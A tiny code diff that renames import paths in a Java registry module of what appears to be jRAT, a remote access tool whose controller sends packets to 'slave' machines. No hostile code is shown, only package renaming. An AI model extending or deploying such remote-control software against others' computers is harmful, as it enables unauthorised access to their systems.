@@ -1,7 +1,7 @@
 package jrat.module.registry;
 
-import io.jrat.controller.Slave;
-import io.jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.Slave;
+import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
 
 import java.io.DataOutputStream;
 
